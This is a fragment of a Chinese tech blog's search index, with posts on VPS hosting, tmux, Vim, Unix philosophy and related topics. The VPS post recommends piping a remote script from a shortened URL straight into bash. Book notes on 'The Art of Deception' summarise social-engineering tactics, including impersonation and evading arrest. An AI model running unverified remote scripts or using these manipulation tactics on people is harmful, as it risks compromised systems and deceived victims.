        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>说说 VPS</title>
    <url>/2019/01/08/talk-about-vps/</url>
    <content><![CDATA[<p><strong>VPS</strong>（Virtual Private Server）即<strong>虚拟专用服务器</strong>，它不等同于<strong>独立服务器</strong>，独立服务器是指货真价实的物理机器，而 VPS 则是在独立服务器上虚拟化的多个虚拟机器。与此类似的，<strong>虚拟空间</strong>（或虚拟主机）则是指 VPS 上某个特定的应用环境，它没有访问系统底层的权限。显然，独立服务器偏贵，虚拟空间限制又多，而 VPS 这一中间选择成为了广大爱好者的首选。</p>
<a id="more"></a>
<h2 id="虚拟化技术"><a href="#虚拟化技术" class="headerlink" title="虚拟化技术"></a>虚拟化技术</h2><p>VPS 所使用的虚拟化技术主要有 <strong>KVM</strong> 和 <strong>OpenVZ</strong> （简称 OVZ），以下是两者的优缺点对比：</p>
<p>KVM：</p>
<ul>
<li>优点：独占内核、内存等</li>
<li>缺点：价格较贵</li>
</ul>
<p>OpenVZ：</p>
<ul>
<li>优点：价格低</li>
<li>缺点：共享内核、内存等</li>
</ul>
<p>简单来说，KVM 拥有对内核更多的控制权，而 OpenVZ 因为共享资源的情况受<strong>超售</strong>影响较大，现在，越来越多的 VPS 商家也开始使用 KVM 架构来虚拟化 VPS。个人建议，尽量选择 KVM 架构的 VPS。</p>
<h2 id="收费方式"><a href="#收费方式" class="headerlink" title="收费方式"></a>收费方式</h2><p>VPS 一般按两种方式收费，即<strong>按月收费</strong>或<strong>按小时收费</strong>，显然，按小时收费更加灵活，当不需要使用时，直接关机就能停止收费。除此之外，VPS 一般会限制每月最多可使用的流量，当超过额度后，会收取流量费。</p>
<h2 id="VPS-商家"><a href="#VPS-商家" class="headerlink" title="VPS 商家"></a>VPS 商家</h2><p>当前主流的 VPS 商家有：<a href="https://bandwagonhost.com/index.php">BandwagonHost</a>，<a href="https://www.vultr.com/">Vultr</a>，<a href="https://www.digitalocean.com/">DigitalOcean</a>。</p>
<p>BandwagonHost，中文又称搬瓦工，它们采用按月收费，支持支付宝付款，在 2019 年之前，它们推出过最低每年 19.99 美元的 VPS，这应该是那时候最便宜且稳定的 VPS 商家了，但如今它们已经取消了这一方案，并全部使用 KVM 架构，现在它们的最低方案是每年 49.99 美元，配置 1G 内存，20G 固态，每月 1T 的流量。</p>
<p>Vultr，它们采用按小时收费的方式，支持支付宝付款，全部采用 KVM 架构，现在最低的方案是每年 42 美元，配置 512MB 内存，10G 固态，每月 0.5T 的流量，个人非常推荐。</p>
<p>DigitalOcean，它们同样采用按小时收费的方式，使用信用卡付款，全部采用 KVM 架构，现在最低的方案是每年 60 美元，配置 1G 内存，25G 固态，每月 1T 的流量。</p>
<h2 id="测试-VPS-性能"><a href="#测试-VPS-性能" class="headerlink" title="测试 VPS 性能"></a>测试 VPS 性能</h2><p>一般在首次连接到 VPS 之后，建议进行一个性能测试，通常要测试的项目包括磁盘性能、网络性能以及一些基本参数等。这里推荐使用 oldking 开发的一键测试脚本 <a href="https://www.oldking.net/350.html">SuperBench.sh</a>，具体使用方法如下命令所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget -qO- git.io/superbench.sh | bash</span><br></pre></td></tr></table></figure>

<h2 id="黑话"><a href="#黑话" class="headerlink" title="黑话"></a>黑话</h2><p>VPS 相关的论坛中经常会有一些行业黑话，以下做简要说明：</p>
<ul>
<li>杜甫：即独服的意思，指前面提到的独立服务器。</li>
<li>母鸡：指用来虚拟化 VPS 的物理主机。</li>
<li>小鸡：即 VPS，尤其指配置比较低的廉价 VPS。</li>
<li>养鸡：续费 VPS 的过程。</li>
<li>CN2 线路：指中国电信与美国日本韩国香港等地机房直连的服务器线路，速度快且稳定。</li>
<li>套路云：指阿里云。</li>
<li>良心云：指腾讯云。</li>
<li>雨林云：指 AWS，取自亚马逊热带雨林。</li>
</ul>
<h2 id="一些建议"><a href="#一些建议" class="headerlink" title="一些建议"></a>一些建议</h2><p>如果你的 VPS 内存较小，比如 512M 内存以下，则建议安装 32 位操作系统。操作系统建议选择 CentOS 7 以上。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>《TAOUP》读书笔记</title>
    <url>/2018/08/02/taoup/</url>
    <content><![CDATA[<p>我没有写错，本文所记述的不是Knuth的那本举世瞩目的TAOCP(计算机程序设计艺术)，而是ESR所写的<strong>TAOUP</strong>，即The Art of UNIX Programming(UNIX编程艺术)。</p>
<h2 id="哲学"><a href="#哲学" class="headerlink" title="哲学"></a>哲学</h2><p>Unix的设计哲学总体上可以概括为以下几点：</p>
<ol>
<li>模块原则：使用简洁的接口拼合简单的部件</li>
<li>清晰原则：清晰胜于机巧</li>
<li>组合原则：设计时考虑拼接组合</li>
<li>分离原则：策略同机制分离，接口同引擎分离</li>
<li>简洁原则：设计要简洁，复杂度能低则低</li>
<li>吝啬原则：除非却无它法，不要编写庞大的程序</li>
<li>透明性原则：设计要可见，以便审查和调试</li>
<li>健壮原则：健壮源于透明与简洁</li>
<li>表示原则：把知识叠入数据以求逻辑质朴而健壮</li>
<li>通俗原则：接口设计避免标新立异</li>
<li>缄默原则：如果一个程序没什么好说的，就沉默</li>
<li>补救原则：出现异常时，马上退出并给出足够错误信息</li>
<li>经济原则：宁花机器一分，不花程序员一秒</li>
<li>生成原则：避免手工hack，尽量编写程序去生成程序</li>
<li>优化原则：雕琢前先要有原型，跑之前先学会走</li>
<li>多样原则：决不相信所谓“不二法门”的断言</li>
<li>扩展原则：设计着眼未来，未来总比预想来得快<a id="more"></a>
所有的Unix哲学浓缩为一条铁律就是<strong>KISS</strong>原则，即Keep It Simple, Stupid！</li>
</ol>
]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>TCP协议分析</title>
    <url>/2018/05/11/tcp/</url>
    <content><![CDATA[<p>TCP(Transmission Control Protocol，传输控制协议)</p>
<h2 id="报文段结构"><a href="#报文段结构" class="headerlink" title="报文段结构"></a>报文段结构</h2><p><img src="/images/tcp.PNG"></p>
<a id="more"></a>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>telnet协议分析</title>
    <url>/2018/08/24/telnet/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>terminal 与 shell</title>
    <url>/2018/09/19/terminal-shell/</url>
    <content><![CDATA[<p><strong>terminal</strong>，常被翻译为<strong>终端</strong>，一般指黑色的窗口，终端可以设置字体、大小、布局和颜色等。Windows 中常见的第三方终端有 <a href="https://conemu.github.io/">ConEmu</a>、<a href="https://cmder.net/">Cmder</a> 等。</p>
<p><strong>shell</strong>，有时也被翻译为外壳或壳层，通常指操作系统中位于用户与内核之间的一层，主要用于和用户交互，因此，shell 分为两类：命令行界面（CLI）和图形用户界面（GUI）。现在所指的 shell 通常指命令行 shell，Linux 中常见的命令行 shell 有 <a href="https://www.gnu.org/software/bash/">Bash</a>、<a href="https://www.zsh.org/">Zsh</a> 等。</p>
<p>通俗点说，terminal 属于外层，shell 属于内层，terminal 包裹着 shell，输入进 terminal 的命令要由 shell 去解释执行。</p>
<a id="more"></a>

<p>和 terminal 很像的一个东西叫 <strong>console</strong>，常被翻译为<strong>控制台</strong>，它也是一个黑色的窗口，用来输入命令，但与 terminal 不同的是，console 与物理相关，且具有<strong>唯一性</strong>。举例来说，没有图形界面的 Linux 开机后，显示在屏幕上的就是 console，它是与这台电脑相关的，且只有一个；而有图形界面的 Linux 开机后，打开的黑色窗口就是 terminal，你可以打开多个。</p>
<p>在 Windows 中，这一切有点混乱，具体就表现在：那个黑色的窗口应该叫<strong>命令提示符</strong>还是<strong>控制台窗口</strong>？就如下图所示：</p>
<p><img src="/images/cmd.jpg" alt="cmd"></p>
<p>首先，命令提示符的本意指的是命令行前面的提示符，在 Linux 中常被称为 <strong>prompt</strong>，如下所示：</p>
<p><img src="/images/prompt.jpg" alt="prompt"></p>
<p>显然，在 Windows 中，命令提示符指的是一种解释执行命令的 shell，此外，控制台窗口应该指的是终端。因此，<strong>在 Windows 中有两种 shell，即命令提示符和 PowerShell，它们都共用了同一终端，即控制台窗口。</strong>这么理解的原因可参考微软的<a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/windows-commands">官方文档</a>，摘录如下：</p>
<blockquote>
<p>Windows has two command shells: The Command shell and PowerShell.</p>
</blockquote>
<p>与 Linux 不同的是，Windows 为每个 shell 都做了一个可执行程序，如命令提示符是 <code>cmd.exe</code>，而 PowerShell 是 <code>powershell.exe</code>，所以在 Windows 中我们习惯说“打开命令提示符”或者“打开 PowerShell”；而在 Linux 中，我们更习惯说“打开终端”。</p>
<p>值得注意的是，在 Windows 10 的最新版本中，微软推出了全新的 <strong><a href="https://github.com/microsoft/terminal">Windows Terminal</a></strong> ，用以取代老旧且功能匮乏的控制台窗口。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>《欺骗的艺术》读书笔记</title>
    <url>/2017/12/05/the-art-of-deception/</url>
    <content><![CDATA[<ol>
<li>人的因素是安全过程中最薄弱的环节。</li>
<li>你只要说你是一个写书的或者写电影剧本的，每个人都会对你开绿灯。</li>
<li>把重要的问题掺杂在琐碎的、不合逻辑的问题中间，这样可以给人一种可信的感觉。</li>
<li>不要在得到关键信息后马上结束谈话。再问两三个问题，闲聊几句，然后才说再见。以后，如果受害者记起你曾经问过什么，则极有可能是最后几个问题，其他的通常都忘掉了。</li>
<li>两三样信息可能就足以支撑起一次成功的假冒行为 —— 社交工程师冒用别人的身份。取得职员的名字、他的电话，以及他的职员编号 —— 或许，最好也能得到其经理的名字和电话 —— 这样，即使一个半瓶子醋的社交工程师，也有了足够的信息，使自己在给下一个目标打电话时听起来非常可信。<a id="more"></a></li>
<li>安全培训需要强调一点：当你有疑虑时，必须确认，确认，再确认。</li>
<li>执法部门的人跟军队里的人一样，从接受训练的第一天起就形成了一个根深蒂固的等级观念。只要社交工程师扮作警官或中尉 —— 级别比跟他谈话的人高 —— 受害者就会拘于一条长时间得来的教训，即“不要质问比你职别高的人”。级别，换个说法，就是特权，尤其是不被级别低的人质问的特权。</li>
<li>每个人都应该明白社交工程师的伎俩：获得尽可能多的与目标有关的信息，再利用这些信息使人相信自己是内部人员。然后一剑封喉。</li>
<li>逆向社交工程学：一种社交工程攻击方式。攻击者建立起这样一个场景：让受害者遇到问题，并向攻击者寻求帮助。逆向社交工程学的另一种表现形式是以其人之道还治其人之身。攻击目标识别出自己受到了攻击，从而利用心理学原理来牵制攻击者，并且从他那里引诱出尽可能多的信息，进而有效的保护目标资产。</li>
<li>新员工最容易成为攻击者的目标。他们认识的人还不多，也不太清楚公司的办事程序，以及什么该做什么不该做。而且，为给人留下良好的第一印象，他们急于表现自己是多么乐于合作与反应迅捷。</li>
<li>第一条原则：除非万不得已，否则不要造访他们的办公室。仅凭着电话中的声音，他们是很难认出你来的，而如果他们不能人称认出你，那就不能逮捕你。</li>
</ol>
]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>社会工程学</tag>
      </tags>
  </entry>
  <entry>
    <title>tmux小记</title>
    <url>/2018/09/18/tmux/</url>
    <content><![CDATA[<p><a href="https://github.com/tmux/tmux">tmux</a>是一款优秀的<strong>终端复用</strong>工具，在Ubuntu下，使用<code>sudo apt install tmux</code>即可安装，输入<code>tmux</code>即可开始使用。与tmux相似的软件还有<a href="https://www.gnu.org/software/screen/">Screen</a>等。</p>
<h2 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h2><h3 id="Session（会话）"><a href="#Session（会话）" class="headerlink" title="Session（会话）"></a>Session（会话）</h3><p>当输入<code>tmux</code>后，实际上创建了一个Session，你可以在这个Session里创建多个Window，在Window里创建多个Pane。</p>
<h3 id="Window（窗口）"><a href="#Window（窗口）" class="headerlink" title="Window（窗口）"></a>Window（窗口）</h3><p>Window是显示给你的一整片窗口，你可以创建多个Window，在一个Window里面你又可以创建多个Pane，以此来执行多个任务。</p>
<h3 id="Pane（窗格-面板）"><a href="#Pane（窗格-面板）" class="headerlink" title="Pane（窗格/面板）"></a>Pane（窗格/面板）</h3><p>Pane是tmux中的最小单位，每个Pane相当于一个终端。</p>
<a id="more"></a>
<p>一个常见的tmux运行效果可能如下图所示：<br><img src="/images/tmux.jpg" alt="tmux"><br>其中，Window被分成了3个Pane，每个Pane之间通过<strong>Pane Border</strong>（面板分隔符）加以区分。Window底部则是<strong>Status Bar</strong>（状态栏），状态栏从左往右依次被分为<strong>左面板</strong>、<strong>窗口列表</strong>、<strong>右面板</strong>。按照上图所示，其中左面板显示了Session的名称，窗口列表则显示了当前Window的索引值和名称，最后右面板依次显示了计算机名称、时间、日期。</p>
<h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><p><code>tmux</code>命令拥有众多参数，如下所示：</p>
<ul>
<li><code>tmux -V</code>：显示tmux版本号</li>
<li><code>tmux ls</code>或<code>tmux list-sessions</code>：列出所有tmux Session</li>
<li><code>tmux a</code>或<code>tmux attach</code>：连接（attach）到上一次的Session</li>
<li><code>tmux a -t 0</code>：连接到名为0的Session</li>
<li><code>tmux new -s basic</code>或<code>tmux new-session -s basic</code>：新建名为basic的Session，若不指定<code>-s</code>参数，则默认按数字命名</li>
<li><code>tmux kill-session -t foo</code>：删除名为foo的Session</li>
<li><code>tmux kill-server</code>：删除所有Session</li>
<li><code>tmux source ~/.tmux.conf</code>：重载配置文件</li>
</ul>
<h2 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h2><p>tmux中的绝大部分操作都需要一个<strong>快捷键前缀</strong>加上相应的指令，tmux中默认的快捷键前缀是<code>Ctrl + b</code>，举例来说，使用<code>prefix + %</code>可以将当前Window分为左右两个Pane，这实际上是说，先按下<code>Ctrl + b</code>，再按下<code>%</code>，即可完成操作。值得注意的是，tmux默认的快捷键前缀是很糟糕的，因为很多程序都会使用到<code>Ctrl + b</code>，但同时，快捷键前缀也是可以自定义的。常用的快捷键如下：</p>
<ul>
<li>Session<ul>
<li><code>prefix + d</code>：离开（datach）当前Session，即退出tmux</li>
</ul>
</li>
<li>Window<ul>
<li><code>prefix + c</code>：创建（create）一个新的Window</li>
<li><code>prefix + n</code>：切换到下一个（next）Window</li>
<li><code>prefix + p</code>：切换到上一个（previous）Window</li>
<li><code>prefix + &amp;</code>：关闭当前Window</li>
</ul>
</li>
<li>Pane<ul>
<li><code>prefix + %</code>：将当前光标所在Pane分为左右两个Pane</li>
<li><code>prefix + &quot;</code>：将当前光标所在Pane分为上下两个Pane</li>
<li><code>prefix + o</code>：在多个Pane之间切换光标，或按上下左右键</li>
<li><code>prefix + x</code>：关闭当前光标所在Pane</li>
<li><code>prefix + ?</code>：查看快捷键列表</li>
<li><code>prefix + :</code>：进入命令行模式（类似Vim）</li>
<li><code>prefix + 空格键</code>：依次轮回使用tmux预定义的Pane布局</li>
</ul>
</li>
</ul>
<p>值得注意的是，当创建Session后，默认会创建一个Window，当创建Window后，默认会创建一个Pane。</p>
<h2 id="tmux-conf"><a href="#tmux-conf" class="headerlink" title=".tmux.conf"></a>.tmux.conf</h2><p><code>$HOME/.tmux.conf</code>文件是tmux的配置文件，tmux在启动时会按照此文件中的命令进行相关配置，个人常用的配置如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 设定快捷键前缀</span><br><span class="line">unbind-key C-b</span><br><span class="line">set-option -g prefix C-x</span><br><span class="line">bind-key C-x send-prefix</span><br><span class="line">set-option -g escape-time 0</span><br><span class="line"></span><br><span class="line"># 开启鼠标模式</span><br><span class="line">set -g mouse on</span><br></pre></td></tr></table></figure>

<h2 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h2><p>tmux支持许多插件，在安装插件之前最好先安装插件管理器<a href="https://github.com/tmux-plugins/tpm">TPM</a>，使用如下命令即可下载TPM：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;tmux-plugins&#x2F;tpm ~&#x2F;.tmux&#x2F;plugins&#x2F;tpm</span><br></pre></td></tr></table></figure>
<p>下载完之后，只需在<code>.tmux.conf</code>文件底部添加相关配置，然后进入tmux输入<code>prefix + I</code>，即可自动下载并安装相应的插件，升级插件可使用<code>prefix + U</code>。个人常用的插件如下：<br>相应的，<code>.tmux.conf</code>文件中插件相关的配置项如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 插件</span><br><span class="line"># List of plugins</span><br><span class="line">set -g @plugin &#39;tmux-plugins&#x2F;tpm&#39;</span><br><span class="line">set -g @plugin &#39;tmux-plugins&#x2F;tmux-sensible&#39;</span><br><span class="line"></span><br><span class="line"># Other examples:</span><br><span class="line"># set -g @plugin &#39;github_username&#x2F;plugin_name&#39;</span><br><span class="line"># set -g @plugin &#39;git@github.com&#x2F;user&#x2F;plugin&#39;</span><br><span class="line"># set -g @plugin &#39;git@bitbucket.com&#x2F;user&#x2F;plugin&#39;</span><br><span class="line"></span><br><span class="line"># Initialize TMUX plugin manager (keep this line at the very bottom of tmux.conf)</span><br><span class="line">run -b &#39;~&#x2F;.tmux&#x2F;plugins&#x2F;tpm&#x2F;tpm&#39;</span><br></pre></td></tr></table></figure>
<p>值得注意的是，在更改<code>.tmux.conf</code>文件后，应该重启tmux，或者重载配置文件。</p>
<h2 id="更多"><a href="#更多" class="headerlink" title="更多"></a>更多</h2><p>有关tmux的更多使用技巧可以参考<a href="https://www.kancloud.cn/kancloud/tmux">《tmux: Productive Mouse-Free Development》</a>一书。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Udacity：Apollo起步学习笔记</title>
    <url>/2018/07/21/udacity-apollo/</url>
    <content><![CDATA[<p>本笔记记录自<a href="https://cn.udacity.com/course/self-driving-car-fundamentals-featuring-apollo--ud0419">ud0419-无人驾驶第一课：从Apollo起步</a>。</p>
<h2 id="一、无人驾驶概览"><a href="#一、无人驾驶概览" class="headerlink" title="一、无人驾驶概览"></a>一、无人驾驶概览</h2><p>无人驾驶车的6个等级：</p>
<ul>
<li>0级——基本等级：驾驶员是系统的唯一决策者。</li>
<li>1级——驾驶员辅助(Driver Assistance)：车辆为驾驶员提供转向或加速支持，驾驶员必须保持充分参与。</li>
<li>2级——部分自动化(Partial Automation)：车辆自动控制几项功能，如自动巡航控制和车道保持，但是驾驶员仍然必须执行自治系统处理的任何功能。</li>
<li>3级——有条件的自动化(Conditional Automation)：车辆自主驾驶，但驾驶员必须准备在必要的时候随时接管。</li>
<li>4级——高度自动化(No Human Interference)：车辆控制驾驶体验的所有面面，并且不期望驾驶员的介入，车辆可能根本没有方向盘或任何驾驶员控制装置，但是车辆可能被限制在某些区域，通常这被称为“地理围栏”，车辆可以在特定的地理围栏内完全自主的运行，但是在地理围栏之外，车辆不能自主操作，或者根本无法操作。</li>
<li>5级——完全自动化(Full Automation)：车辆可以在人类可以驾驶的任何地方完全自主地运行，在所有情况下应与人类驾驶员的水平一样高或比其更高。</li>
</ul>
<a id="more"></a>
<p>无人驾驶车的5个核心部件：</p>
<ul>
<li>计算机视觉(Computer Vision)：通过摄像头图像弄清楚我们周围的世界是怎样的。</li>
<li>传感器融合(Sensor Fusion)：合并来自其他传感器的数据，如激光和雷达，从而更加深入的了解我们周围的环境。</li>
<li>定位(Localization)：精确的确定我们在那个世界所处的位置。</li>
<li>路径规划(Path Planning)：绘制这个世界的路线，帮助我们到达我们想去的地方。</li>
<li>控制(Control)：为了让汽车沿着我们在路径规划期间建立的轨道。</li>
</ul>
<p>Apollo技术框架包含的4个层面：</p>
<ul>
<li>参考车辆平台</li>
<li>参考硬件平台</li>
<li>开源软件平台</li>
<li>云服务平台</li>
</ul>
<h2 id="二、高精度地图"><a href="#二、高精度地图" class="headerlink" title="二、高精度地图"></a>二、高精度地图</h2>]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>无人驾驶</tag>
        <tag>Apollo</tag>
      </tags>
  </entry>
  <entry>
    <title>URI与URL的区别</title>
    <url>/2018/04/29/url-uri/</url>
    <content><![CDATA[<p>URI，全称&quot;Uniform Resource Identifier&quot;，中文“统一资源标志符”，是一个用于标识某一互联网资源名称的字符串。URI的最常见的形式是统一资源定位符（URL），经常指定为非正式的网址。更罕见的用法是统一资源名称（URN），其目的是通过提供一种途径，用于在特定的名字空间资源的标识，以补充网址。</p>
<p>URL，全称&quot;Uniform Resource Locator&quot;，中文“统一资源定位符”，URL是URI的子集。示例如下：<br><code>https://howiezhao.github.io/2018/04/29/url-uri/</code><br>上面这个URL唯一标识了互联网中一台服务器上的一篇文章(即本篇文章)。<br>URL的格式一般为<code>scheme:[//[user[:password]@]host[:port]][/path][?query][#fragment]</code></p>
<p>URN，全称&quot;Uniform Resource Name&quot;，中文“统一资源名称”，是另一种形式的URI，它通过特定命名空间中的唯一名称来标识资源。示例如下：<br><code>urn:isbn:9780141036144</code><br>上面这个URN唯一标识了乔治·奥威尔所著的《1984》。</p>
<p>简单说，URL代表一个人的位置，URN代表一个人的身份证号，通过URL和URN都可以唯一的找到这个人，所以它们都属于URI。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>useradd与adduser</title>
    <url>/2018/07/16/useradd-adduser/</url>
    <content><![CDATA[<p>在Linux中创建用户可以用<code>useradd</code>或者<code>adduser</code>，值得注意的是创建的用户并不一定可以登录，登录的用户肯定要有它的用户主目录、登录Shell等相关配置，而这两个命令之间的差异就在于此。</p>
<h2 id="adduser"><a href="#adduser" class="headerlink" title="adduser"></a>adduser</h2><p>当使用<code>adduser howie</code>命令时，系统除了创建howie用户，还会自动创建用户主目录、同名用户组、登录Shell等，并提示输入用户密码，这一切操作都将以一个对话的形式完成。</p>
<h2 id="useradd"><a href="#useradd" class="headerlink" title="useradd"></a>useradd</h2><p>当使用<code>useradd howie</code>命令时，系统只会创建howie用户，而不会创建用户密码、用户主目录、同名用户组、登录shell等，若要指定密码，可以接着采用<code>passwd howie</code>命令。其次，<code>useradd</code>有众多参数，我们可以通过使用这些参数来达到和<code>adduser</code>一样的效果，如<code>useradd -d /home/howie -m -s /bin/bash howie</code>，不过注意之后还得使用<code>passwd</code>命令创建密码，当然也可以使用<code>-p</code>参数直接设置密码，但这样会将密码直接显示在终端屏幕上，不安全。</p>
<h2 id="userdel"><a href="#userdel" class="headerlink" title="userdel"></a>userdel</h2><p>当使用<code>userdel howie</code>命令时，系统只会删除howie用户，并不会删除用户主目录以及用户邮箱目录，因此可以使用<code>-r</code>参数。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>版本号的意义</title>
    <url>/2018/09/21/version-number/</url>
    <content><![CDATA[<p>软件版本号的确定没有一个统一的规范，但大都遵循一个固定的格式，即<code>X.Y.Z</code>格式，其中：</p>
<ul>
<li>X代表<strong>主版本号</strong>，一般当软件整体重写，或出现不向后兼容的改变等重大更新时，增加X，同时重置Y、Z为0，X为0时表示软件还在开发阶段；</li>
<li>Y代表<strong>次版本号</strong>，增删功能时增加Y，同时重置Z为0；</li>
<li>Z代表<strong>修订号</strong>，修复Bug时增加Z。</li>
</ul>
<p>除此之外，还会有一些修饰词，比如：</p>
<ul>
<li><code>alpha</code>表示内部测试版；</li>
<li><code>beta</code>表示公开测试版；</li>
<li><code>rc</code>即Release Candidate，表示候选版本，即将作为正式版发布；</li>
<li><code>release</code>表示正式发行版；</li>
<li><code>lts</code>即Long Term Support，表示长期支持版。</li>
</ul>
<p>有的项目有自己的一套规则，比如Ubuntu、Visual Studio等，它们采用发布年份作为版本号；Node.js规定X为偶数的是稳定版，X为奇数的是开发版；TeX的版本号不断趋近于π。<br>随着版本号定义的越来越混乱，GitHub起草了一个<a href="https://semver.org/lang/zh-CN/">语义化版本(Semantic Versioning)</a>规范，为开源项目做出了一定指导意义。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>Vim小记</title>
    <url>/2018/09/18/vim/</url>
    <content><![CDATA[<p>在几乎所有的Linux发行版中，都会自带vi文本编辑器，而<a href="https://www.vim.org/">Vim</a>（Vi IMproved）则是vi的一个增强版，大多数Linux中也都预装了Vim，若没有安装，可使用相应的包管理工具进行安装，具体而言，在Ubuntu中，使用<code>sudo apt install vim</code>即可安装。输入<code>vim --version</code>可以查看所使用的Vim版本，当前最新版本为Vim 8.x。值得注意的是，在有的系统中，<code>vi</code>命令实际是指向<code>vim</code>命令的一个链接，使用<code>which vi</code>即可证实。</p>
<p>在2015年，开源组织发布了<a href="https://neovim.io/">Neovim</a>项目，它是Vim的重构版本，需自行安装。另外，GVim是Vim的一个图形客户端。</p>
<a id="more"></a>
<h2 id="三种模式"><a href="#三种模式" class="headerlink" title="三种模式"></a>三种模式</h2><p>Vim有许多模式，但常用的其实是普通模式、插入模式、命令行模式这三种。</p>
<h3 id="普通模式（Normal）"><a href="#普通模式（Normal）" class="headerlink" title="普通模式（Normal）"></a>普通模式（Normal）</h3><p>Vim启动后默认为普通模式，此时Vim编辑器左下角将依次显示文件名、行数、字符数，右下角将依次显示当前光标所在的行与列、当前屏幕显示的字数占文件总字数的百分比。在普通模式下可以使用相当多的快捷键来完成相应的操作，常用的命令如下：</p>
<ul>
<li><code>x</code>：删除当前光标所在字符</li>
<li><code>dd</code>：删除当前行</li>
<li><code>0</code>：到行头</li>
<li><code>$</code>：到行尾</li>
<li><code>u</code>：撤销</li>
</ul>
<h3 id="插入模式（Insert）"><a href="#插入模式（Insert）" class="headerlink" title="插入模式（Insert）"></a>插入模式（Insert）</h3><p>在普通模式下输入<code>i</code>(insert)，即可切换到插入模式，此时Vim编辑器左下角将显示<code>-- INSERT --</code>标识。在插入模式下，可完成输入文字等功能。最后，按下<code>Esc</code>键可退回普通模式。</p>
<h3 id="命令行模式"><a href="#命令行模式" class="headerlink" title="命令行模式"></a>命令行模式</h3><p>在命令行模式下可以输入会被执行的相关命令，例如执行命令(<code>:</code>键)、搜索命令(<code>/</code>键)或者过滤命令(<code>!</code>键)。此时，Vim编辑器左下角将显示输入的命令。在命令执行之后，Vim将返回到命令行模式之前的模式，通常是普通模式。<br>在命令行模式下常使用的命令有：</p>
<ul>
<li><code>:wq</code>：保存(write)并退出(quit)</li>
<li><code>:1</code>：跳转到第一行，类似的，跳转到第n行则为<code>:n</code></li>
<li><code>:set nu</code>：显示行号(number)，类似的，<code>:set nonu</code>为不显示行号</li>
<li><code>:set ff=unix</code>：设置文件为unix格式</li>
</ul>
<h2 id="vimrc"><a href="#vimrc" class="headerlink" title="vimrc"></a>vimrc</h2><p>Vim有多个配置文件，当前用户的配置文件为用户家目录下的<code>.vimrc</code>隐藏文件，Vim启动时会按照该文件中的配置开启相应的功能。个人常做的基本配置项如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot; 这是一行注释</span><br><span class="line">&quot; 显示行号</span><br><span class="line">set number</span><br><span class="line"></span><br><span class="line">&quot; 语法高亮</span><br><span class="line">syntax enable</span><br><span class="line"></span><br><span class="line">&quot; tab缩进</span><br><span class="line">set tabstop&#x3D;4</span><br><span class="line">set shiftwidth&#x3D;4</span><br><span class="line">set expandtab</span><br><span class="line">set smarttab</span><br><span class="line"></span><br><span class="line">&quot; 鼠标可用</span><br><span class="line">&quot;set mouse&#x3D;a</span><br><span class="line"></span><br><span class="line">&quot; 配色方案</span><br><span class="line">set t_Co&#x3D;256</span><br><span class="line">set background&#x3D;dark</span><br><span class="line">colorscheme desert</span><br><span class="line"></span><br><span class="line">&quot; 匹配模式</span><br><span class="line">set showmatch</span><br><span class="line"></span><br><span class="line">&quot; 自动缩进</span><br><span class="line">set autoindent</span><br><span class="line">set smartindent</span><br><span class="line"></span><br><span class="line">&quot; 显示命令</span><br><span class="line">set showcmd</span><br></pre></td></tr></table></figure>
<h2 id="主题"><a href="#主题" class="headerlink" title="主题"></a>主题</h2><p>Vim自带了多种主题，即配色方案，默认存放在Vim安装目录下的colors文件夹下，在Vim中输入命令<code>:echo $VIMRUNTIME</code>即可显示Vim的安装目录，以我的为例，其安装目录为<code>/usr/share/vim/vim80</code>。</p>
<p>如果你想更改默认的主题，可以按照上面的配置，在<code>vimrc</code>文件中使用<code>colorscheme &lt;主题名&gt;</code>进行配置。Vim默认使用的是<code>default</code>主题。如果你想使用第三方或自定义的主题，则需要将下载的主题文件存放到colors文件夹下（<code>~/.vim/colors</code>下也行），然后再进行相关配置。</p>
<h2 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h2><p>Vim支持很多插件，为了简化插件的安装，由此诞生了许多的插件管理器，<a href="https://github.com/VundleVim/Vundle.vim">Vundle</a>是使用最多的Vim插件管理器，但个人倾向于使用<a href="https://github.com/junegunn/vim-plug">vim-plug</a>插件管理器，vim-plug相比Vundle最大的优势是支持异步安装，该特性可以极大的加速多个插件的安装速度。<br>使用如下命令即可安装vim-plug：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -fLo ~/.vim/<span class="built_in">autoload</span>/plug.vim --create-dirs \</span><br><span class="line">    https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim</span><br></pre></td></tr></table></figure>
